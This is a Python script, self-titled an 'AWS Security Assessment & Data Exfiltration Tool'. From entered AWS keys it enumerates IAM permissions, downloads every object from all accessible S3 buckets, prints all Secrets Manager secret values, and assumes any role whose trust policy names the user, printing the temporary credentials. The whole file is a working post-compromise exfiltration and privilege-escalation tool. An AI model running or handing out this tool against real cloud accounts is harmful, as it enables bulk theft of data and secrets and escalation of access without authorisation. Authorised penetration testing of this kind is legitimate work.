import boto3
import json
import os
from datetime import datetime
from pathlib import Path
from colorama import init, Fore, Back, Style
from tqdm import tqdm
from loguru import logger
import sys

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Configure loguru logger
logger.remove()  # Remove default handler
logger.add(sys.stdout, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{name}</cyan>:<cyan>{function}</cyan>:<cyan>{line}</cyan> - <level>{message}</level>")
logger.add("aws_security_assessment.log", rotation="10 MB", retention="7 days")

def custom_serializer(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

def print_policy_document(doc):
    print(f"{Fore.CYAN}{json.dumps(doc, indent=4, sort_keys=True)}{Style.RESET_ALL}")

def safe_filename(filename):
    """Convert S3 key to safe local filename/path"""
    safe_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\"
    return ''.join(c if c in safe_chars else '_' for c in filename)

def download_s3_object(s3_client, bucket_name, obj_key, local_base_path, pbar=None):
    """Download S3 object and create necessary directories"""
    try:
        # Create safe local path
        safe_key = safe_filename(obj_key)
        local_path = Path(local_base_path) / safe_key
        
        # Create parent directories
        local_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Download file with progress
        logger.info(f"Downloading: {obj_key} -> {local_path}")
        s3_client.download_file(bucket_name, obj_key, str(local_path))
        
        if pbar:
            pbar.update(1)
            pbar.set_postfix_str(f"Downloaded: {obj_key[:50]}...")
        
        print(f"  {Fore.GREEN}✅ Downloaded: {obj_key}{Style.RESET_ALL}")
        return True
    except Exception as e:
        error_msg = f"Error downloading {obj_key}: {e}"
        logger.error(error_msg)
        print(f"  {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
        return False

def list_and_download_bucket(s3_client, bucket_name):
    """Recursively list and download all objects from a bucket"""
    print(f"\n{Fore.YELLOW}=== Processing Bucket: {bucket_name} ==={Style.RESET_ALL}")
    logger.info(f"Starting to process bucket: {bucket_name}")
    
    # Create local directory for bucket
    bucket_dir = Path("s3_downloads") / safe_filename(bucket_name)
    bucket_dir.mkdir(parents=True, exist_ok=True)
    
    try:
        # Get bucket location
        try:
            location = s3_client.get_bucket_location(Bucket=bucket_name)
            region = location.get('LocationConstraint', 'us-east-1')
            print(f"{Fore.CYAN}Bucket region: {region}{Style.RESET_ALL}")
            logger.info(f"Bucket {bucket_name} region: {region}")
        except Exception as e:
            logger.warning(f"Could not get bucket location for {bucket_name}: {e}")
            print(f"{Fore.YELLOW}Could not get bucket location: {e}{Style.RESET_ALL}")
        
        # First, count total objects for progress bar
        print(f"{Fore.BLUE}Counting objects in bucket...{Style.RESET_ALL}")
        paginator = s3_client.get_paginator('list_objects_v2')
        page_iterator = paginator.paginate(Bucket=bucket_name)
        
        total_objects = 0
        total_size = 0
        objects_list = []
        
        for page in page_iterator:
            if 'Contents' in page:
                for obj in page['Contents']:
                    total_objects += 1
                    total_size += obj['Size']
                    objects_list.append(obj)
        
        if total_objects == 0:
            print(f"{Fore.YELLOW}No objects found in bucket {bucket_name}{Style.RESET_ALL}")
            logger.info(f"No objects found in bucket {bucket_name}")
            return
        
        print(f"{Fore.GREEN}Found {total_objects} objects ({total_size:,} bytes / {total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        logger.info(f"Bucket {bucket_name}: {total_objects} objects, {total_size} bytes")
        
        # Download with progress bar
        downloaded_count = 0
        with tqdm(total=total_objects, desc=f"Downloading from {bucket_name}", 
                 unit="file", colour="green") as pbar:
            
            for obj in objects_list:
                obj_key = obj['Key']
                obj_size = obj['Size']
                
                pbar.set_description(f"Downloading {obj_key[:30]}... ({obj_size:,} bytes)")
                
                # Download the object
                if download_s3_object(s3_client, bucket_name, obj_key, bucket_dir, pbar):
                    downloaded_count += 1
        
        # Summary
        success_rate = (downloaded_count / total_objects) * 100
        print(f"\n{Fore.GREEN}Bucket Summary:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Total objects: {total_objects}{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}Successfully downloaded: {downloaded_count}{Style.RESET_ALL}")
        print(f"  {Fore.BLUE}Success rate: {success_rate:.1f}%{Style.RESET_ALL}")
        print(f"  {Fore.MAGENTA}Total size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB){Style.RESET_ALL}")
        
        logger.info(f"Bucket {bucket_name} summary: {downloaded_count}/{total_objects} downloaded ({success_rate:.1f}%)")
        
    except Exception as e:
        error_msg = f"Error processing bucket {bucket_name}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# Header
print(f"{Fore.CYAN}{Back.BLACK}")
print("=" * 60)
print("    AWS Security Assessment & Data Exfiltration Tool")
print("=" * 60)
print(f"{Style.RESET_ALL}")

logger.info("Starting AWS Security Assessment")

# Prompting for credentials and inputs
print(f"{Fore.YELLOW}Please provide AWS credentials:{Style.RESET_ALL}")
access_key = input(f"{Fore.GREEN}Enter AWS Access Key ID: {Style.RESET_ALL}").strip()
secret_access_key = input(f"{Fore.GREEN}Enter AWS Secret Access Key: {Style.RESET_ALL}").strip()
region = input(f"{Fore.GREEN}Enter AWS Region [default: us-east-1]: {Style.RESET_ALL}").strip() or 'us-east-1'
bucket = input(f"{Fore.GREEN}Enter specific S3 Bucket name (leave blank to scan all accessible buckets): {Style.RESET_ALL}").strip()

logger.info(f"Configured for region: {region}")

# Initiating AWS session
print(f"\n{Fore.BLUE}Initializing AWS session...{Style.RESET_ALL}")
try:
    session = boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_access_key,
        region_name=region
    )

    # Initialize clients
    s3_client = session.client("s3")
    sts_client = session.client("sts")
    secrets_client = session.client("secretsmanager")
    iam_client = session.client("iam")
    
    print(f"{Fore.GREEN}✅ AWS session initialized successfully{Style.RESET_ALL}")
    logger.info("AWS session initialized successfully")
    
except Exception as e:
    error_msg = f"Failed to initialize AWS session: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
    sys.exit(1)

# Print STS identity
username = None
print(f"\n{Fore.YELLOW}=== Identity Information ==={Style.RESET_ALL}")
try:
    sts_caller_info = sts_client.get_caller_identity()
    print(f"{Fore.CYAN}UserId: {sts_caller_info['UserId']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Account: {sts_caller_info['Account']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}ARN: {sts_caller_info['Arn']}{Style.RESET_ALL}")
    
    logger.info(f"Identity: {sts_caller_info['Arn']}")

    arn_parts = sts_caller_info['Arn'].split('/')
    if len(arn_parts) >= 2:
        username = arn_parts[-1]
        logger.info(f"Extracted username: {username}")
        
except Exception as e:
    error_msg = f"Error getting caller identity: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# IAM user policy/group info
if username:
    print(f"\n{Fore.YELLOW}=== IAM Info for User: {username} ==={Style.RESET_ALL}")
    logger.info(f"Analyzing IAM permissions for user: {username}")
    
    try:
        # Attached managed policies
        attached_policies = iam_client.list_attached_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Attached Managed Policies:{Style.RESET_ALL}")
        for policy in attached_policies.get("AttachedPolicies", []):
            print(f" {Fore.GREEN}- {policy['PolicyName']} (ARN: {policy['PolicyArn']}){Style.RESET_ALL}")
            logger.info(f"Found attached policy: {policy['PolicyName']}")
            
            policy_detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
            version_id = policy_detail["Policy"]["DefaultVersionId"]
            policy_version = iam_client.get_policy_version(
                PolicyArn=policy["PolicyArn"],
                VersionId=version_id
            )
            print(f"   {Fore.BLUE}Permissions for {policy['PolicyName']}:{Style.RESET_ALL}")
            print_policy_document(policy_version["PolicyVersion"]["Document"])

        # Inline policies
        inline_policies = iam_client.list_user_policies(UserName=username)
        print(f"\n{Fore.MAGENTA}Inline Policies:{Style.RESET_ALL}")
        for policy_name in inline_policies.get("PolicyNames", []):
            print(f" {Fore.GREEN}- {policy_name}{Style.RESET_ALL}")
            logger.info(f"Found inline policy: {policy_name}")
            
            policy_doc = iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
            print(f"   {Fore.BLUE}Permissions:{Style.RESET_ALL}")
            print_policy_document(policy_doc["PolicyDocument"])

        # Group memberships
        user_groups = iam_client.list_groups_for_user(UserName=username)
        print(f"\n{Fore.MAGENTA}Groups:{Style.RESET_ALL}")
        for group in user_groups.get("Groups", []):
            group_name = group['GroupName']
            print(f" {Fore.GREEN}- {group_name} (ARN: {group['Arn']}){Style.RESET_ALL}")
            logger.info(f"Found group membership: {group_name}")

            # Managed policies attached to group
            attached_group_policies = iam_client.list_attached_group_policies(GroupName=group_name)
            for policy in attached_group_policies.get("AttachedPolicies", []):
                print(f"   {Fore.CYAN}Attached Managed Policy: {policy['PolicyName']} (ARN: {policy['PolicyArn']}){Style.RESET_ALL}")
                policy_detail = iam_client.get_policy(PolicyArn=policy["PolicyArn"])
                version_id = policy_detail["Policy"]["DefaultVersionId"]
                policy_version = iam_client.get_policy_version(
                    PolicyArn=policy["PolicyArn"],
                    VersionId=version_id
                )
                print(f"     {Fore.BLUE}Permissions for {policy['PolicyName']}:{Style.RESET_ALL}")
                print_policy_document(policy_version["PolicyVersion"]["Document"])

            # Inline group policies
            inline_group_policies = iam_client.list_group_policies(GroupName=group_name)
            for policy_name in inline_group_policies.get("PolicyNames", []):
                print(f"   {Fore.CYAN}Inline Policy: {policy_name}{Style.RESET_ALL}")
                policy_doc = iam_client.get_group_policy(GroupName=group_name, PolicyName=policy_name)
                print(f"     {Fore.BLUE}Permissions:{Style.RESET_ALL}")
                print_policy_document(policy_doc["PolicyDocument"])

    except Exception as e:
        error_msg = f"Error fetching IAM details for {username}: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# S3 Bucket Discovery and Download
print(f"\n{Fore.YELLOW}=== S3 Bucket Analysis ==={Style.RESET_ALL}")
logger.info("Starting S3 bucket analysis")

# Create main download directory
Path("s3_downloads").mkdir(exist_ok=True)

if bucket:
    # Download specific bucket
    logger.info(f"Processing specific bucket: {bucket}")
    list_and_download_bucket(s3_client, bucket)
else:
    # List all accessible buckets and download from each
    try:
        print(f"{Fore.BLUE}Discovering accessible S3 buckets...{Style.RESET_ALL}")
        buckets_response = s3_client.list_buckets()
        buckets = buckets_response.get('Buckets', [])
        
        print(f"{Fore.GREEN}Found {len(buckets)} accessible buckets:{Style.RESET_ALL}")
        logger.info(f"Found {len(buckets)} accessible buckets")
        
        for i, bucket_info in enumerate(buckets, 1):
            bucket_name = bucket_info['Name']
            creation_date = bucket_info['CreationDate']
            print(f"{Fore.CYAN}{i}. {bucket_name} {Fore.YELLOW}(Created: {creation_date}){Style.RESET_ALL}")
        
        if buckets:
            print(f"\n{Fore.MAGENTA}Proceeding to download from all {len(buckets)} buckets...{Style.RESET_ALL}")
            
            # Process each bucket with overall progress
            with tqdm(total=len(buckets), desc="Processing buckets", unit="bucket", colour="blue") as bucket_pbar:
                for bucket_info in buckets:
                    bucket_name = bucket_info['Name']
                    bucket_pbar.set_description(f"Processing {bucket_name}")
                    list_and_download_bucket(s3_client, bucket_name)
                    bucket_pbar.update(1)
        else:
            print(f"{Fore.YELLOW}No accessible buckets found.{Style.RESET_ALL}")
            logger.info("No accessible buckets found")
            
    except Exception as e:
        error_msg = f"Error listing buckets: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# List secrets
print(f"\n{Fore.YELLOW}=== Secrets Manager Analysis ==={Style.RESET_ALL}")
logger.info("Starting Secrets Manager analysis")

try:
    secrets_list = secrets_client.list_secrets()
    print(f"{Fore.CYAN}Secrets List:{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{json.dumps(secrets_list, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
    
    secret_count = len(secrets_list.get("SecretList", []))
    logger.info(f"Found {secret_count} secrets")
    
    if secret_count > 0:
        with tqdm(total=secret_count, desc="Retrieving secrets", unit="secret", colour="red") as secrets_pbar:
            for secret in secrets_list.get("SecretList", []):
                name = secret.get("Name")
                if name:
                    secrets_pbar.set_description(f"Retrieving {name[:30]}...")
                    try:
                        secret_dump = secrets_client.get_secret_value(SecretId=name)
                        print(f"\n{Fore.GREEN}Secret: {name}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}{json.dumps(secret_dump, indent=4, sort_keys=True, default=custom_serializer)}{Style.RESET_ALL}")
                        logger.info(f"Successfully retrieved secret: {name}")
                    except Exception as e:
                        error_msg = f"Error retrieving secret '{name}': {e}"
                        logger.error(error_msg)
                        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    
                    secrets_pbar.update(1)
    else:
        print(f"{Fore.YELLOW}No secrets found.{Style.RESET_ALL}")
        
except Exception as e:
    error_msg = f"Error listing secrets: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# Role discovery and assumption
print(f"\n{Fore.YELLOW}=== Role Assumption Analysis ==={Style.RESET_ALL}")
logger.info("Starting role assumption analysis")

try:
    marker = None
    matching_roles = []
    all_roles = []
    
    # First, collect all roles
    print(f"{Fore.BLUE}Collecting all IAM roles...{Style.RESET_ALL}")
    while True:
        roles_response = iam_client.list_roles(Marker=marker) if marker else iam_client.list_roles()
        all_roles.extend(roles_response["Roles"])
        
        if roles_response.get("IsTruncated"):
            marker = roles_response["Marker"]
        else:
            break
    
    logger.info(f"Found {len(all_roles)} total roles")
    print(f"{Fore.GREEN}Analyzing {len(all_roles)} roles for assumability...{Style.RESET_ALL}")
    
    # Analyze roles with progress bar
    with tqdm(total=len(all_roles), desc="Analyzing roles", unit="role", colour="yellow") as roles_pbar:
        for role in all_roles:
            role_name = role["RoleName"]
            role_arn = role["Arn"]
            trust_policy = role["AssumeRolePolicyDocument"]
            trust_policy_json = json.dumps(trust_policy)
            
            roles_pbar.set_description(f"Analyzing {role_name[:30]}...")

            # Check if user or ARN appears in trust relationship
            if username and (username in trust_policy_json or sts_caller_info['Arn'] in trust_policy_json):
                print(f"\n{Fore.MAGENTA}Role '{role_name}' might be assumable by user '{username}'{Style.RESET_ALL}")
                print(f" {Fore.CYAN}- Role ARN: {role_arn}{Style.RESET_ALL}")
                print(f" {Fore.BLUE}- Trust Policy:{Style.RESET_ALL}")
                print_policy_document(trust_policy)
                matching_roles.append(role_name)
                logger.info(f"Found potentially assumable role: {role_name}")

                # Try to assume it
                try:
                    assume_response = sts_client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=f"TestSession-{username}"
                    )
                    print(f" {Fore.GREEN}✅ AssumeRole succeeded!{Style.RESET_ALL}")
                    credentials = assume_response["Credentials"]
                    print(f" {Fore.YELLOW}Temporary session credentials:{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- AccessKeyId: {credentials['AccessKeyId']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- SecretAccessKey: {credentials['SecretAccessKey']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- SessionToken: {credentials['SessionToken']}{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}- Expiration: {credentials['Expiration']}{Style.RESET_ALL}")
                    logger.success(f"Successfully assumed role: {role_name}")
                except Exception as assume_error:
                    error_msg = f"Could not assume role '{role_name}': {assume_error}"
                    print(f" {Fore.RED}❌ {error_msg}{Style.RESET_ALL}")
                    logger.warning(error_msg)
            
            roles_pbar.update(1)

    if not matching_roles:
        print(f"{Fore.YELLOW}No assumable roles found for the current user.{Style.RESET_ALL}")
        logger.info("No assumable roles found")
    else:
        logger.info(f"Found {len(matching_roles)} potentially assumable roles")
        
except Exception as e:
    error_msg = f"Error while listing/analyzing roles: {e}"
    logger.error(error_msg)
    print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

# Final Summary
print(f"\n{Fore.GREEN}{Back.BLACK}")
print("=" * 60)
print("                    ASSESSMENT COMPLETE")
print("=" * 60)
print(f"{Style.RESET_ALL}")

print(f"{Fore.GREEN}✅ AWS Security Assessment Complete{Style.RESET_ALL}")
print(f"{Fore.CYAN}📁 S3 downloads saved to: ./s3_downloads/{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}📋 Detailed log saved to: aws_security_assessment.log{Style.RESET_ALL}")
print(f"{Fore.YELLOW}🔍 Check the output above for IAM permissions, secrets, and role analysis{Style.RESET_ALL}")

logger.success("AWS Security Assessment completed successfully")